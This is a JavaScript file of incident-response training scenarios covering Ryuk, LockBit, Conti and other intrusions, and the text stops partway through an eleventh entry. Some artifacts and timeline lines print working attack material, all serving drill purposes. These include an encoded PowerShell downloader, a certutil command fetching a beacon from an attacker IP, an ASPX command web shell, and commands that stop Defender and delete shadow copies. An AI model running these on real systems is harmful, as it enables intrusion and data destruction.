// Copyright (c) 2026 SpartanKing18. All rights reserved.
// Incident Response Training Scenarios — 50 detailed scenarios for IR drills

export const INCIDENT_SCENARIOS = [
  {
    id: "IR-001", title: "Ryuk Ransomware via Phishing", category: "ransomware", severity: "critical",
    description: "A finance department employee opened a macro-enabled Excel attachment purporting to be an overdue invoice from a known vendor. The macro executed a PowerShell downloader that fetched TrickBot, which performed reconnaissance for 48 hours before deploying Ryuk ransomware across the domain. By Sunday morning, 340 of 400 Windows endpoints displayed the ransom note demanding 50 BTC. Backup shares mounted via SMB were also encrypted. The domain controller remained operational but Active Directory showed signs of Kerberoasting.",
    timeline: [
      { time: "T-48:00", event: "Phishing email received by accounts-payable@corp.local from spoofed vendor domain" },
      { time: "T-47:55", event: "User opens Invoice_Q4_Final.xlsm — macro executes PowerShell encoded downloader" },
      { time: "T-47:50", event: "PowerShell contacts hxxps://cdn-update[.]xyz/stage1.ps1 and downloads TrickBot loader" },
      { time: "T-47:45", event: "TrickBot establishes C2 beacon to 185.100.87[.]41 on port 443" },
      { time: "T-46:00", event: "TrickBot runs net group \"Domain Admins\" /domain, nltest /dclist, systeminfo" },
      { time: "T-40:00", event: "Credential harvesting via Mimikatz — domain admin hash obtained from LSASS" },
      { time: "T-36:00", event: "Lateral movement to file server via pass-the-hash using wmiexec" },
      { time: "T-24:00", event: "TrickBot spreads to 12 additional hosts using EternalBlue (MS17-010)" },
      { time: "T-12:00", event: "Attacker maps all network shares and identifies backup server at \\\\backup01" },
      { time: "T-6:00", event: "Shadow copies deleted on all compromised hosts: vssadmin delete shadows /all /quiet" },
      { time: "T-2:00", event: "Ryuk binary pushed to all reachable hosts via PsExec using stolen domain admin creds" },
      { time: "T+0:00", event: "Ryuk executes simultaneously on 340 endpoints — encryption begins" },
      { time: "T+0:15", event: "Ransom note RyukReadMe.html appears on all encrypted machines — 50 BTC demand" },
      { time: "T+0:30", event: "IT helpdesk receives first user reports of inaccessible files" },
      { time: "T+1:00", event: "SOC confirms ransomware incident — CSIRT activated" },
      { time: "T+2:00", event: "Network segmentation enacted — affected VLANs isolated" },
      { time: "T+6:00", event: "Forensic imaging of patient zero workstation begins" },
      { time: "T+24:00", event: "Offline backups from Friday night identified — 48hr data loss confirmed" },
      { time: "T+72:00", event: "Rebuild begins from clean images — domain password reset enforced" }
    ],
    artifacts: [
      { type: "email", description: "Original phishing email headers", content: "From: billing@vendor-invoices[.]com\nTo: accounts-payable@corp.local\nSubject: URGENT: Overdue Invoice #INV-2026-4491\nX-Mailer: Microsoft Outlook 16.0\nReceived: from mail.vendor-invoices[.]com (185.234.72[.]19)\nContent-Type: multipart/mixed; boundary=\"----=_Part_441\"" },
      { type: "log", description: "PowerShell ScriptBlock log (Event ID 4104)", content: "ScriptBlock ID: {a3f2e7b1-4c89-4d12-b5a6-8e9f0c1d2e3a}\npowershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC4AeAB5AHoALwBzAHQAYQBnAGUAMQAuAHAAcwAxACcAKQA=" },
      { type: "log", description: "Windows Security Event 4624 — Logon Type 3 (network)", content: "An account was successfully logged on.\nLogon Type: 3\nNew Logon: Account Name: da-admin\nSource Network Address: 10.0.5.22\nWorkstation Name: WS-FIN-014\nLogon Process: NtLmSsp" },
      { type: "file", description: "Ryuk ransom note", content: "Your network has been penetrated.\nAll files on each host in the network have been encrypted with a strong algorithm.\nBackups were either encrypted or deleted.\nNo free decryption software is available.\nContact: RyukSupport@protonmail.com\nBTC Wallet: bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh\nAmount: 50 BTC" },
      { type: "registry", description: "TrickBot persistence key", content: "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\nName: WinDefService\nType: REG_SZ\nData: C:\\Users\\jsmith\\AppData\\Roaming\\msvc\\svchost.exe" }
    ],
    questions: [
      { q: "What was the initial access vector?", answer: "Phishing email with a macro-enabled Excel attachment (T1566.001). The macro executed a PowerShell downloader that fetched the TrickBot loader." },
      { q: "How did the attackers achieve lateral movement?", answer: "Two methods: pass-the-hash using stolen domain admin credentials via wmiexec (T1550.002), and exploitation of MS17-010/EternalBlue (T1210) to spread TrickBot to additional hosts." },
      { q: "Why were backups also encrypted?", answer: "Backups were stored on SMB network shares (\\\\backup01) that were accessible from the compromised domain admin account. The attacker mapped all shares during reconnaissance." },
      { q: "What should have prevented the credential theft?", answer: "Credential Guard or LSA protection (RunAsPPL) would have protected LSASS from Mimikatz. Network segmentation limiting domain admin logons to dedicated admin workstations (PAWs) would have prevented credential exposure on user endpoints." },
      { q: "What is the recommended recovery approach?", answer: "Do NOT pay the ransom. Rebuild from offline backups (48hr data loss). Reset all domain credentials. Rebuild domain controllers from scratch. Patch MS17-010 across all endpoints. Implement network segmentation. Deploy EDR." },
      { q: "How could this have been detected earlier?", answer: "The TrickBot C2 beacon ran for 48 hours. Network monitoring for beaconing patterns (regular interval HTTPS connections to uncommon domains), PowerShell logging (Event ID 4104), and EDR detection of Mimikatz/credential dumping would have caught this in the recon phase." }
    ],
    iocs: ["185.100.87.41", "cdn-update.xyz", "RyukSupport@protonmail.com", "bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh", "Invoice_Q4_Final.xlsm", "svchost.exe (in AppData\\Roaming\\msvc\\)"],
    mitre_techniques: ["T1566.001", "T1059.001", "T1055", "T1003.001", "T1550.002", "T1210", "T1490", "T1486", "T1021.002"],
    lessons_learned: ["Implement email attachment sandboxing and macro blocking policies", "Deploy EDR with credential theft detection", "Store backups offline or in immutable storage", "Segment network — admin workstations separate from user endpoints", "Enable PowerShell ScriptBlock logging and forward to SIEM", "Conduct tabletop ransomware exercises quarterly"]
  },
  {
    id: "IR-002", title: "LockBit 3.0 Double Extortion", category: "ransomware", severity: "critical",
    description: "An attacker exploited an unpatched Fortinet VPN appliance (CVE-2023-27997) to gain initial access to the corporate network. Over five days, the operator escalated privileges through a misconfigured AD Certificate Services template (ESC1), exfiltrated 200GB of sensitive data to a Mega.nz cloud account, and deployed LockBit 3.0 ransomware. The attacker's leak site posted a countdown timer threatening to publish stolen data unless a $2M ransom was paid within 72 hours.",
    timeline: [
      { time: "T-120:00", event: "Exploitation of Fortinet SSL VPN heap overflow (CVE-2023-27997) — shell obtained" },
      { time: "T-119:00", event: "Reverse shell established via ncat to attacker C2 at 91.215.85[.]142:8443" },
      { time: "T-118:00", event: "Local enumeration: whoami, ipconfig, net user, systeminfo" },
      { time: "T-110:00", event: "Pivot to internal network via SSH tunnel through VPN appliance" },
      { time: "T-96:00", event: "BloodHound enumeration reveals ESC1 vulnerable certificate template" },
      { time: "T-90:00", event: "Certipy used to request certificate as Domain Admin via ESC1 template" },
      { time: "T-88:00", event: "Certificate used to authenticate as Domain Admin via PKINIT" },
      { time: "T-72:00", event: "Data discovery: file shares enumerated, sensitive directories identified" },
      { time: "T-48:00", event: "Rclone installed and configured to sync to Mega.nz cloud storage" },
      { time: "T-36:00", event: "200GB exfiltrated: HR records, financial reports, customer PII, source code" },
      { time: "T-12:00", event: "Volume shadow copies deleted, Windows Defender disabled via GPO" },
      { time: "T-6:00", event: "LockBit 3.0 binary distributed via Group Policy scheduled task" },
      { time: "T+0:00", event: "Encryption begins across 500+ endpoints and 12 servers" },
      { time: "T+0:30", event: "Ransom note appears — $2M demand with 72hr countdown on leak site" },
      { time: "T+1:00", event: "SOC alerted by mass file extension changes (.lockbit)" },
      { time: "T+4:00", event: "Legal counsel engaged, law enforcement notified (FBI IC3)" },
      { time: "T+12:00", event: "Data breach notification assessment begins — PII exposure confirmed" }
    ],
    artifacts: [
      { type: "log", description: "Fortinet VPN exploitation log", content: "date=2026-09-01 time=03:14:22 logid=\"0001000014\" type=\"event\" subtype=\"system\" level=\"alert\" msg=\"SSL VPN heap buffer overflow detected\" srcip=91.215.85.142 dstip=10.0.0.1 action=\"detected\"" },
      { type: "log", description: "Certificate enrollment event", content: "EventID: 4887\nCertificate Services approved and issued certificate.\nRequester: CORP\\ws-vpn01$\nTemplate: UserAuthentication-Legacy\nSubject: CN=Administrator,DC=corp,DC=local" },
      { type: "file", description: "Rclone configuration found on compromised host", content: "[mega-exfil]\ntype = mega\nuser = exfil-drop-2026@protonmail.com\npass = [ENCRYPTED]" }
    ],
    questions: [
      { q: "What was the root cause of initial access?", answer: "Unpatched Fortinet SSL VPN appliance vulnerable to CVE-2023-27997 (heap-based buffer overflow). The patch had been available for months but was not applied." },
      { q: "How was the ADCS vulnerability exploited?", answer: "The ESC1 attack: a certificate template allowed low-privileged users to specify an arbitrary Subject Alternative Name (SAN), enabling the attacker to request a certificate as Domain Admin and authenticate via PKINIT." },
      { q: "What regulatory obligations arise from the data exfiltration?", answer: "With PII exposed, GDPR notification (72hrs to DPA), state breach notification laws (varies, typically 30-60 days), potential PCI DSS obligations if payment data was included, and SEC disclosure if publicly traded." },
      { q: "How should the organization handle the leak site threat?", answer: "Do not pay. Engage legal counsel, notify law enforcement, prepare public disclosure statement, monitor the leak site, and begin breach notification process assuming data will be published." }
    ],
    iocs: ["91.215.85.142", "exfil-drop-2026@protonmail.com", "rclone.exe", "mega.nz", ".lockbit extension"],
    mitre_techniques: ["T1190", "T1572", "T1558.004", "T1649", "T1560", "T1567.002", "T1486", "T1490", "T1484.001"],
    lessons_learned: ["Implement automated vulnerability scanning and patching for edge devices", "Audit ADCS templates for ESC1-ESC8 vulnerabilities using Certipy or PSPKIAudit", "Monitor for large outbound data transfers (DLP/CASB)", "Block unauthorized cloud storage services at the proxy", "Maintain offline/immutable backups tested quarterly"]
  },
  {
    id: "IR-003", title: "Conti Ransomware via ProxyShell", category: "ransomware", severity: "critical",
    description: "Attackers exploited the ProxyShell vulnerability chain (CVE-2021-34473, CVE-2021-34523, CVE-2021-31207) on an internet-facing Exchange server to drop a web shell. They used the web shell to deploy Cobalt Strike, harvested credentials, and moved laterally through the domain. After disabling security tools and deleting backups, Conti ransomware was deployed to 180 systems across two business units.",
    timeline: [
      { time: "T-168:00", event: "ProxyShell exploitation — SSRF + privilege escalation + arbitrary file write on Exchange" },
      { time: "T-167:55", event: "ASPX web shell written to C:\\inetpub\\wwwroot\\aspnet_client\\system_web\\error.aspx" },
      { time: "T-166:00", event: "Web shell used to execute: certutil -urlcache -split -f hxxp://45.32.109[.]71/beacon.exe" },
      { time: "T-165:00", event: "Cobalt Strike beacon established — C2 via HTTPS to teamserver at 45.32.109.71" },
      { time: "T-144:00", event: "SharpHound run for AD enumeration — results exfiltrated to C2" },
      { time: "T-120:00", event: "DCSync attack — all domain password hashes extracted" },
      { time: "T-96:00", event: "Lateral movement to domain controller via RDP with stolen DA credentials" },
      { time: "T-72:00", event: "Antivirus disabled via WMIC: wmic /node:@targets.txt process call create \"cmd /c sc stop WinDefend\"" },
      { time: "T-48:00", event: "Backup agent stopped and Veeam backup files deleted" },
      { time: "T-24:00", event: "Conti ransomware loader placed on SYSVOL share for domain-wide distribution" },
      { time: "T+0:00", event: "Conti encrypts 180 systems — ransom demand: $1.5M in BTC" },
      { time: "T+1:00", event: "Exchange admin notices web shell during routine maintenance — incident declared" }
    ],
    artifacts: [
      { type: "log", description: "IIS log showing ProxyShell exploitation", content: "2026-09-01 03:14:22 POST /autodiscover/autodiscover.json @evil.com/powershell/?X-Rps-CAT=... 200 - 45.32.109.71" },
      { type: "file", description: "Web shell content", content: "<%@ Page Language=\"C#\" %>\n<%@ Import Namespace=\"System.Diagnostics\" %>\n<% Process.Start(new ProcessStartInfo(\"cmd.exe\",\"/c \" + Request[\"c\"]){UseShellExecute=false,RedirectStandardOutput=true}); %>" },
      { type: "log", description: "DCSync detection — Event 4662", content: "An operation was performed on an object.\nObject Type: domainDNS\nAccess Mask: 0x100 (Control Access)\nProperties: {1131f6aa-9c07-11d1-f79f-00c04fc2dcd2} (DS-Replication-Get-Changes)" }
    ],
    questions: [
      { q: "Why wasn't the ProxyShell patch applied?", answer: "Common reasons: Exchange was managed by a different team with its own patching schedule, the organization lacked an edge device vulnerability management program, or patching was deferred due to concerns about Exchange downtime." },
      { q: "What is the DCSync attack and how should it be detected?", answer: "DCSync abuses the MS-DRSR replication protocol to request password hashes from a domain controller, mimicking a legitimate DC. Detect via Event ID 4662 with control access to DS-Replication-Get-Changes (GUID 1131f6aa-...) from a non-DC source." },
      { q: "How should Exchange web shells be detected?", answer: "Monitor C:\\inetpub\\wwwroot\\ and Exchange virtual directories for new .aspx files. Use the Exchange Health Checker script. Run: Get-ChildItem -Path 'C:\\inetpub\\wwwroot' -Recurse -Filter '*.aspx' | Where-Object {$_.CreationTime -gt (Get-Date).AddDays(-7)}" }
    ],
    iocs: ["45.32.109.71", "error.aspx", "beacon.exe", "certutil -urlcache"],
    mitre_techniques: ["T1190", "T1505.003", "T1059.001", "T1003.006", "T1021.001", "T1562.001", "T1490", "T1486"],
    lessons_learned: ["Patch internet-facing Exchange within 48hrs of critical CVE publication", "Monitor for new .aspx files in Exchange directories", "Detect DCSync via Event 4662 replication access from non-DCs", "Implement backup immutability — prevent deletion even with admin credentials"]
  },
  {
    id: "IR-004", title: "BlackCat/ALPHV via Compromised RDP", category: "ransomware", severity: "critical",
    description: "Remote Desktop Protocol exposed to the internet with weak credentials was brute-forced by the BlackCat (ALPHV) affiliate. After gaining access, the attacker disabled EDR using a vulnerable kernel driver (BYOVD technique), exfiltrated data, and deployed the BlackCat ransomware written in Rust. The cross-platform ransomware also propagated to Linux servers via SSH keys found on the compromised Windows admin workstation.",
    timeline: [
      { time: "T-72:00", event: "RDP brute force from 193.42.33[.]10 — 4,200 failed attempts over 6 hours" },
      { time: "T-66:00", event: "Successful RDP login with admin:Winter2026! on exposed jump server" },
      { time: "T-64:00", event: "Attacker installs AnyDesk for persistent remote access" },
      { time: "T-60:00", event: "BYOVD: vulnerable driver (truesight.sys) loaded to disable CrowdFalcon EDR" },
      { time: "T-48:00", event: "Mimikatz run — domain admin credentials harvested" },
      { time: "T-36:00", event: "SSH keys found in C:\\Users\\admin\\.ssh\\id_rsa — used to access 8 Linux servers" },
      { time: "T-24:00", event: "Data exfiltration via rclone to SFTP server at 185.56.83[.]71" },
      { time: "T-6:00", event: "BlackCat/ALPHV binary deployed — Windows (.exe) and Linux (ELF) variants" },
      { time: "T+0:00", event: "Encryption of Windows and Linux systems simultaneously" },
      { time: "T+0:30", event: "ALPHV leak site updated with company name and 72hr countdown" },
      { time: "T+2:00", event: "IT discovers encrypted systems on Monday morning" }
    ],
    artifacts: [
      { type: "log", description: "RDP brute force — Event 4625", content: "An account failed to log on.\nLogon Type: 10 (RemoteInteractive)\nAccount Name: admin\nSource Network Address: 193.42.33.10\nFailure Reason: Unknown user name or bad password.\nStatus: 0xC000006D Sub Status: 0xC000006A" },
      { type: "file", description: "BYOVD driver", content: "File: truesight.sys\nSHA256: 6a4b0e5f7c8d9e0f1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0b1c2d3e4f\nSigner: Expired certificate from TrueSight Technologies\nPurpose: Exploited to gain kernel access and disable EDR processes" }
    ],
    questions: [
      { q: "Why was RDP exposed to the internet?", answer: "Likely a misconfiguration or shadow IT — the jump server may have been set up during COVID remote work and never decommissioned. RDP (port 3389) should never be directly exposed; use VPN or a bastion host." },
      { q: "What is the BYOVD technique?", answer: "Bring Your Own Vulnerable Driver: the attacker loads a legitimately signed but vulnerable kernel driver to gain kernel-level access, which is then exploited to disable EDR/AV from kernel mode where security tools cannot defend themselves." },
      { q: "How did the attack spread to Linux?", answer: "SSH private keys stored on the compromised Windows admin workstation were used to authenticate to Linux servers without passwords. This highlights the risk of storing cross-platform credentials on endpoints." }
    ],
    iocs: ["193.42.33.10", "185.56.83.71", "truesight.sys", "AnyDesk", "admin:Winter2026!"],
    mitre_techniques: ["T1110.001", "T1021.001", "T1219", "T1068", "T1562.001", "T1003.001", "T1021.004", "T1567", "T1486"],
    lessons_learned: ["Never expose RDP to the internet — use VPN or Zero Trust", "Implement account lockout after 5 failed attempts", "Block known-vulnerable drivers with WDAC/driver blocklist", "Do not store SSH keys on multi-purpose workstations", "Enforce MFA on all remote access"]
  },
  {
    id: "IR-005", title: "Play Ransomware via Managed Service Provider", category: "ransomware", severity: "critical",
    description: "Attackers compromised a managed service provider's (MSP) remote monitoring and management (RMM) tool to push Play ransomware to 15 client organizations simultaneously. The MSP's ConnectWise ScreenConnect instance was exploited via CVE-2024-1709 (authentication bypass). From the MSP's management console, the attacker deployed ransomware across all managed clients in under 2 hours.",
    timeline: [
      { time: "T-24:00", event: "ScreenConnect authentication bypass (CVE-2024-1709) exploited on MSP infrastructure" },
      { time: "T-23:00", event: "Attacker gains admin access to MSP's ScreenConnect console managing 15 clients" },
      { time: "T-20:00", event: "Reconnaissance: list all managed endpoints across all client tenants" },
      { time: "T-12:00", event: "Play ransomware binary uploaded to ScreenConnect file transfer" },
      { time: "T-2:00", event: "Batch script created to deploy and execute ransomware on all endpoints" },
      { time: "T+0:00", event: "Ransomware pushed to 2,400 endpoints across 15 organizations simultaneously" },
      { time: "T+0:30", event: "First client reports encrypted files — MSP realizes scope of compromise" },
      { time: "T+1:00", event: "MSP disconnects ScreenConnect server from internet" },
      { time: "T+2:00", event: "All 15 clients notified — coordinated incident response begins" }
    ],
    artifacts: [
      { type: "log", description: "ScreenConnect exploitation", content: "2026-09-01 02:00:15 [WARN] SetupWizard accessed from 103.75.201[.]44 — new admin account created: support_backup" }
    ],
    questions: [
      { q: "What makes MSP compromises particularly dangerous?", answer: "MSPs have privileged access to multiple client environments through RMM tools. A single MSP compromise can cascade to all managed clients simultaneously, multiplying the blast radius exponentially." },
      { q: "What should clients require of their MSPs?", answer: "MFA on all admin tools, IP allowlisting for management consoles, timely patching of RMM platforms, separate credentials per client tenant, incident notification SLAs, and evidence of SOC 2 Type II compliance." }
    ],
    iocs: ["103.75.201.44", "support_backup account", "ScreenConnect CVE-2024-1709"],
    mitre_techniques: ["T1190", "T1199", "T1072", "T1486"],
    lessons_learned: ["MSPs must patch RMM tools within 24hrs of critical CVEs", "Implement MFA and IP restrictions on management consoles", "Clients should require break-glass procedures to disconnect MSP access", "Monitor for unusual mass deployments from RMM tools"]
  },
  {
    id: "IR-006", title: "Maze Ransomware with Data Leak", category: "ransomware", severity: "critical",
    description: "The Maze ransomware group targeted a healthcare organization, exploiting a vulnerable Citrix NetScaler (CVE-2019-19781) for initial access. After two weeks of reconnaissance, they exfiltrated 40GB of patient health information (PHI) before deploying ransomware. The group published samples of stolen PHI on their leak site, triggering HIPAA breach notification requirements for 150,000 patients.",
    timeline: [
      { time: "T-336:00", event: "Citrix NetScaler directory traversal (CVE-2019-19781) exploited" },
      { time: "T-330:00", event: "Web shell placed in /vpns/portal/scripts/" },
      { time: "T-288:00", event: "Cobalt Strike beacon deployed — lateral movement begins" },
      { time: "T-240:00", event: "EMR (Electronic Medical Records) database server accessed" },
      { time: "T-168:00", event: "Database dumps of patient records initiated (SQL export)" },
      { time: "T-96:00", event: "40GB exfiltrated via FTP to attacker-controlled server" },
      { time: "T-24:00", event: "Ransomware preparation — security tools disabled, shadows deleted" },
      { time: "T+0:00", event: "Maze ransomware deployed across clinical and administrative systems" },
      { time: "T+12:00", event: "Maze leak site publishes sample of 500 patient records as pressure" },
      { time: "T+24:00", event: "HHS OCR notification initiated — HIPAA Breach Notification Rule triggered" }
    ],
    artifacts: [
      { type: "log", description: "Citrix exploitation attempt", content: "GET /vpn/../vpns/cfg/smb.conf HTTP/1.1\nHost: citrix.healthcare.org\nUser-Agent: Mozilla/5.0\nConnection: close" }
    ],
    questions: [
      { q: "What HIPAA obligations arise from this incident?", answer: "Under the HIPAA Breach Notification Rule, the organization must notify affected individuals within 60 days, HHS OCR without unreasonable delay, and prominent media outlets if more than 500 residents of a state are affected. A risk assessment must determine if the PHI was actually acquired." },
      { q: "Does paying the ransom guarantee data deletion?", answer: "No. Ransomware groups have been documented re-extorting victims, selling data despite payment, and failing to delete exfiltrated data. Payment also does not satisfy HIPAA breach notification obligations." }
    ],
    iocs: ["CVE-2019-19781", "/vpns/portal/scripts/ web shell", "Cobalt Strike beacon"],
    mitre_techniques: ["T1190", "T1505.003", "T1071.001", "T1530", "T1048.003", "T1486"],
    lessons_learned: ["Healthcare organizations must prioritize patching internet-facing appliances", "Implement network segmentation between clinical and administrative systems", "Deploy DLP monitoring for PHI exfiltration", "Maintain HIPAA-compliant incident response plan with legal counsel"]
  },
  {
    id: "IR-007", title: "REvil Ransomware via Kaseya VSA", category: "ransomware", severity: "critical",
    description: "The REvil group exploited zero-day vulnerabilities in Kaseya VSA (on-premises) to push ransomware through the MSP supply chain, ultimately affecting an estimated 1,500 downstream businesses. The attack targeted Independence Day weekend for maximum impact with minimal staff.",
    timeline: [
      { time: "T-2:00", event: "REvil exploits Kaseya VSA authentication bypass and SQL injection (CVE-2021-30116)" },
      { time: "T-1:30", event: "Malicious update package created: agent.crt (encrypted ransomware payload)" },
      { time: "T+0:00", event: "VSA pushes fake agent update to all managed endpoints via legitimate update mechanism" },
      { time: "T+0:05", event: "Update executes: certutil decodes agent.crt → ransomware binary" },
      { time: "T+0:10", event: "Windows Defender disabled, encryption begins on ~1,500 businesses" },
      { time: "T+0:30", event: "Kaseya advises all customers to shut down VSA servers immediately" },
      { time: "T+24:00", event: "REvil demands $70M for universal decryptor" },
      { time: "T+240:00", event: "FBI obtains universal decryptor key — distributed to victims" }
    ],
    artifacts: [
      { type: "log", description: "Kaseya VSA procedure log", content: "Procedure: Kaseya VSA Agent Hot-fix\nExecuted: certutil -decode c:\\kworking\\agent.crt c:\\kworking\\agent.exe\nFollowed by: c:\\kworking\\agent.exe" }
    ],
    questions: [
      { q: "What made this attack so effective?", answer: "It exploited the trusted software update mechanism of an MSP management tool, bypassing all endpoint security because the malicious payload was delivered through a legitimate, trusted channel that security tools would whitelist." }
    ],
    iocs: ["agent.crt", "agent.exe in c:\\kworking\\", "Kaseya VSA zero-day"],
    mitre_techniques: ["T1195.002", "T1190", "T1072", "T1140", "T1562.001", "T1486"],
    lessons_learned: ["Supply chain attacks through trusted software require defense-in-depth", "MSP tools should have break-glass network isolation procedures", "Weekend/holiday timing is a common ransomware tactic — maintain incident response coverage"]
  },
  {
    id: "IR-008", title: "DarkSide Ransomware — Colonial Pipeline", category: "ransomware", severity: "critical",
    description: "A compromised VPN credential (found in a dark web password dump) provided DarkSide ransomware operators access to Colonial Pipeline's IT network. The company proactively shut down OT (operational technology) systems as a precaution, causing a 6-day shutdown of the largest fuel pipeline in the US, leading to fuel shortages across the southeastern United States.",
    timeline: [
      { time: "T-7:00:00", event: "VPN login with compromised credential — no MFA enforced on legacy VPN account" },
      { time: "T-120:00", event: "Lateral movement within IT network" },
      { time: "T-48:00", event: "100GB of data exfiltrated" },
      { time: "T+0:00", event: "DarkSide ransomware deployed on IT systems" },
      { time: "T+1:00", event: "Colonial Pipeline shuts down OT systems as precautionary measure" },
      { time: "T+24:00", event: "$4.4M ransom paid in Bitcoin" },
      { time: "T+144:00", event: "Pipeline operations resume after 6-day shutdown" },
      { time: "T+720:00", event: "DOJ recovers $2.3M of the ransom payment from Bitcoin wallet" }
    ],
    artifacts: [
      { type: "log", description: "VPN authentication", content: "Legacy VPN concentrator — no MFA\nAccount: inactive-employee-vpn\nSource: Tor exit node\nStatus: SUCCESS — account was never deprovisioned" }
    ],
    questions: [
      { q: "Why were OT systems shut down if only IT was encrypted?", answer: "Colonial Pipeline stated they could not confirm the ransomware hadn't spread to OT systems, and the IT systems included billing systems needed to measure fuel delivery. Without billing capability, they couldn't charge customers, forcing the shutdown." },
      { q: "What was the root cause?", answer: "A single compromised password for a VPN account that was no longer in use but never deprovisioned, with no MFA requirement." }
    ],
    iocs: ["DarkSide ransomware", "Tor exit node VPN access", "inactive-employee-vpn account"],
    mitre_techniques: ["T1078.001", "T1133", "T1486", "T1567"],
    lessons_learned: ["Enforce MFA on ALL VPN accounts with zero exceptions", "Decommission inactive accounts within 24hrs of employee departure", "Segment IT and OT networks with strict boundary controls", "Credential monitoring for corporate passwords in dark web dumps"]
  },
  {
    id: "IR-009", title: "Clop Ransomware via MOVEit Zero-Day", category: "ransomware", severity: "critical",
    description: "The Clop ransomware group mass-exploited a zero-day SQL injection vulnerability in Progress MOVEit Transfer (CVE-2023-34362) to steal data from hundreds of organizations. Unlike typical ransomware, Clop did not encrypt files — they solely exfiltrated data and demanded ransom to prevent publication. The attack affected government agencies, banks, airlines, and universities worldwide.",
    timeline: [
      { time: "T+0:00", event: "Mass exploitation of MOVEit Transfer instances begins (Memorial Day weekend)" },
      { time: "T+0:05", event: "SQL injection via /moveitisapi/moveitisapi.dll creates web shell: human2.aspx" },
      { time: "T+0:10", event: "Web shell used to enumerate databases and extract stored files" },
      { time: "T+0:30", event: "Automated exfiltration of all files stored in MOVEit across hundreds of instances" },
      { time: "T+72:00", event: "Progress Software issues emergency patch for CVE-2023-34362" },
      { time: "T+168:00", event: "Clop begins posting victim names on leak site" },
      { time: "T+336:00", event: "Second wave: CVE-2023-35036 discovered — another MOVEit SQLi" },
      { time: "T+504:00", event: "Third wave: CVE-2023-35708 discovered — yet another bypass" }
    ],
    artifacts: [
      { type: "log", description: "MOVEit exploitation", content: "POST /moveitisapi/moveitisapi.dll HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\naction=m2&... SQL injection payload ..." },
      { type: "file", description: "Web shell", content: "human2.aspx — ASPX web shell providing file system access and database query capability via HTTP" }
    ],
    questions: [
      { q: "Why was this attack so widespread?", answer: "MOVEit Transfer is used by thousands of organizations for secure file transfer, often containing the most sensitive data (payroll, HR, financial). The zero-day was exploited en masse before any patch existed, and many instances were internet-facing by design." },
      { q: "Why didn't Clop encrypt files?", answer: "Data-theft-only extortion is more scalable — no need for per-victim ransomware deployment, simpler operations, and the legal/regulatory pressure from data exposure can be more compelling than operational disruption." }
    ],
    iocs: ["human2.aspx", "/moveitisapi/moveitisapi.dll", "CVE-2023-34362"],
    mitre_techniques: ["T1190", "T1505.003", "T1530", "T1567"],
    lessons_learned: ["Minimize internet-facing file transfer appliances", "Web application firewalls can provide virtual patching for zero-days", "Monitor managed file transfer platforms for unusual web shell creation", "Have a plan for mass-exploitation events affecting your supply chain"]
  },
  {
    id: "IR-010", title: "Akira Ransomware via Cisco VPN", category: "ransomware", severity: "high",
    description: "Akira ransomware operators exploited a Cisco ASA VPN without MFA to gain initial access. They used the VPN connection to pivot internally, deployed a custom credential stealer, and exfiltrated data before deploying Akira ransomware which targeted both Windows and VMware ESXi hypervisors, encrypting virtual machines at the hypervisor level.",
    timeline: [
      { time: "T-96:00", event: "VPN authentication with valid credentials (no MFA) from Tor exit node" },
      { time: "T-90:00", event: "Internal network scanning with Advanced IP Scanner" },
      { time: "T-72:00", event: "Credential dumping from DCs using ntdsutil" },
      { time: "T-48:00", event: "SSH access to ESXi hypervisors using harvested root credentials" },
      { time: "T-24:00", event: "Data staged and exfiltrated via WinSCP to attacker infrastructure" },
      { time: "T+0:00", event: "Akira deployed: Windows variant via RDP, Linux variant directly on ESXi" },
      { time: "T+0:15", event: "ESXi VMs encrypted — entire virtualization infrastructure offline" },
      { time: "T+1:00", event: "IT discovers all VMs are inaccessible — incident declared" }
    ],
    artifacts: [
      { type: "log", description: "Cisco ASA VPN log", content: "Sep 01 2026 02:14:33: %ASA-6-113015: AAA user authentication Successful: server=LOCAL: user=vpn-admin\nSep 01 2026 02:14:33: %ASA-6-716001: Group <DfltGrpPolicy> User <vpn-admin> IP <185.220.101.42>" }
    ],
    questions: [
      { q: "Why is ESXi targeting so devastating?", answer: "A single ESXi host may run dozens of VMs. Encrypting at the hypervisor level takes out entire server farms with one action — all VMs become inaccessible simultaneously without needing to compromise each one individually." }
    ],
    iocs: ["185.220.101.42", "Advanced IP Scanner", "ntdsutil", "WinSCP", "Akira ransomware"],
    mitre_techniques: ["T1078", "T1133", "T1018", "T1003.003", "T1021.004", "T1567", "T1486"],
    lessons_learned: ["Enforce MFA on VPN — no exceptions, including legacy appliances", "Isolate hypervisor management interfaces on a dedicated VLAN", "ESXi root credentials should be unique, rotated, and stored in a PAM vault", "Monitor for ESXi SSH access from non-admin workstations"]
  },
  // --- DATA BREACH SCENARIOS ---
  {
    id: "IR-011", title: "SQL Injection Data Breach — Customer PII", category: "data_breach", severity: "critical",
    description: "A blind SQL injection vulnerability in the customer login page of a SaaS application allowed an attacker to extract the entire customer database over 72 hours using automated sqlmap queries. The database contained 2.3 million customer records including names, emails, phone numbers, hashed passwords (MD5 without salt), and partial credit card numbers. The breach was discovered when extracted data appeared on a dark web marketplace.",
    timeline: [
      { time: "T-72:00", event: "Automated SQL injection probing begins against /api/v2/auth/login endpoint" },
      { time: "T-71:00", event: "Blind boolean-based SQLi confirmed — sqlmap database enumeration begins" },
      { time: "T-60:00", event: "Database schema extracted: tables users, payments, orders, sessions identified" },
      { time: "T-48:00", event: "Users table dump begins — 2.3M records extracted via time-based blind SQLi" },
      { time: "T-24:00", event: "Payments table extracted — partial credit card numbers (first 6 + last 4 digits)" },
      { time: "T+0:00", event: "Extraction complete — attacker disappears" },
      { time: "T+336:00", event: "Threat intel feed alerts: company's customer data listed on dark web for $15,000" },
      { time: "T+337:00", event: "Security team purchases sample — confirms authentic customer records" },
      { time: "T+338:00", event: "Incident response activated — WAF logs reveal sqlmap user-agent strings" },
      { time: "T+340:00", event: "Vulnerability identified and patched — parameterized queries implemented" },
